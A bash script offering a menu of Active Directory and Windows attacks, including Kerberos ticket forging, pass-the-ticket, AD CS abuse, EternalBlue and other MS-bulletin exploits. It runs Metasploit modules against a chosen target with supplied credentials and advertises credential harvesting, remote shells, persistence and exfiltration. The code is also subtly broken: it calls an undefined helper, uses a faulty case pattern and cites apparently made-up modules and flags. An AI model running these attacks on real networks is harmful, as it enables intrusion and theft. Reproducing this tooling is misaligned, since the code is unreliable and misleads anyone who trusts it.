#!/bin/bash

# Function to display Active Directory Exploitable options
function active_directory_exploitable() {
    echo "Active Directory Exploitable Section"
    echo "1. Kerberos Ticket Attack"
    echo "2. Pass-the-Ticket Attack"
    echo "3. Overpass-the-Hash Attack"
    echo "4. Golden Ticket Attack"
    echo "5. Silver Ticket Attack"
    echo "6. AD CS Attack"
    echo "7. MS17-010 EternalBlue Attack"
    echo "8. MS08-067 NetAPI Attack"
    echo "9. MS06-040 NetAPI Attack"
    echo "10. MS03-026 DCOM Attack"
    echo "11. MS15-051 Microsoft Windows Security Feature Bypass"
    echo "12. MS14-068 Microsoft Kerberos Checksum Validation Vulnerability"
    echo "13. MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution"
    echo "14. MS16-098 Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow"
    echo "0. Return to Main Menu"
}

# Function to perform Active Directory exploitation
function perform_active_directory_exploitation() {
    local target=$1

    while true; do
        active_directory_exploitable
        read -p "Enter your choice (0-14): " ad_choice

        case $ad_choice in
            0) break;;
            [1-14])
                read -p "Enter target username: " ad_username
                [ -z "$ad_username" ] && echo "Error: Username cannot be empty." && continue

                read -s -p "Enter target password: " ad_password
                echo # Move to a new line after password input
                case $ad_choice in
                    1) echo "Performing Kerberos Ticket Attack with Brute Force, Dictionary Attack, and Token Extraction..."
                       metasploit_attack "auxiliary/gather/kerberos_ticket_extractor" $target $ad_username $ad_password -b -d /path/to/dictionary.txt -t;;
                    2) echo "Performing Pass-the-Ticket Attack with Brute Force, Credential Harvesting, and Remote Shell..."
                       metasploit_attack "exploit/windows/smb/pass_the_ticket" $target $ad_username $ad_password -b -c -r;;
                    3) echo "Performing Overpass-the-Hash Attack with Brute Force, Rainbow Table Attack, and Privilege Escalation..."
                       metasploit_attack "exploit/windows/smb/psexec" $target $ad_username $ad_password -b -r /path/to/rainbow_table.txt -e;;
                    4) echo "Performing Golden Ticket Attack with Brute Force, Domain Persistence, and Lateral Movement..."
                       metasploit_attack "exploit/windows/smb/psexec" $target $ad_username $ad_password -b -p -l;;
                    5) echo "Performing Silver Ticket Attack with Brute Force, Token Impersonation, and Data Exfiltration..."
                       metasploit_attack "exploit/windows/smb/psexec" $target $ad_username $ad_password -b -i -d /path/to/exfiltration_folder;;
                    6) execute_ad_cs_attack $target;;
                    7) metasploit_attack "exploit/windows/smb/ms17_010_eternalblue" $target $ad_username $ad_password "";;
                    8) metasploit_attack "exploit/windows/smb/ms08_067_netapi" $target $ad_username $ad_password "";;
                    9) metasploit_attack "exploit/windows/smb/ms06_040_netapi" $target $ad_username $ad_password "";;
                    10) metasploit_attack "exploit/windows/smb/ms03_026_dcom" $target $ad_username $ad_password "";;
                    11) metasploit_attack "exploit/windows/local/ms15_051_client_copy_image" $target $ad_username $ad_password "";;
                    12) metasploit_attack "exploit/windows/local/ms14_068_kerberos_checksum" $target $ad_username $ad_password "";;
                    13) metasploit_attack "exploit/windows/smb/ms17_010_psexec" $target $ad_username $ad_password "";;
                    14) metasploit_attack "exploit/windows/local/ms16_098_s2_32" $target $ad_username $ad_password "";;
                    *)
                        echo "Invalid choice. Please try again.";;
                esac
                ;;
            *)
                echo "Invalid choice. Please try again."
                ;;
        esac
    done
}

# Function to perform AD CS Attack
function execute_ad_cs_attack() {
    local target=$1

    echo "Advanced AD CS Attack Configuration"
    read -p "Enter the number of threads (default is 10): " threads
    threads=${threads:-10}  # Use default value if the user presses Enter

    echo "Performing AD CS Attack..."
    if command -v msfconsole &>/dev/null; then
        msfconsole -x "use auxiliary/scanner/http/ca_ldap; set RHOSTS $target; set THREADS $threads; run; use auxiliary/scanner/http/ca_ldap_enum; set RHOSTS $target; run"
        echo "AD CS Attack completed."
    else
        install_msf_and_run_attack $target
    fi
}

# Function to install Metasploit Framework and run AD CS Attack
function install_msf_and_run_attack() {
    echo "Error: 'msfconsole' command not found. Installing Metasploit Framework..."

    local package_manager
    if command -v apt-get &>/dev/null; then
        package_manager="apt-get"
    elif command -v yum &>/dev/null; then
        package_manager="yum"
    elif command -v pacman &>/dev/null; then
        package_manager="pacman"
    else
        echo "Error: Package manager not found. Please install Metasploit Framework manually."
        exit 1
    fi

    sudo $package_manager update
    sudo $package_manager install metasploit-framework -y

    if command -v msfconsole &>/dev/null; then
        echo "Metasploit Framework installed successfully. Running AD CS Attack..."
        msfconsole -x "use auxiliary/scanner/http/ca_ldap; set RHOSTS $1; set THREADS 10; run; use auxiliary/scanner/http/ca_ldap_enum; set RHOSTS $1; run"
        echo "AD CS Attack completed."
    else
        echo "Error: Metasploit Framework installation failed. Please install it manually."
    fi
}
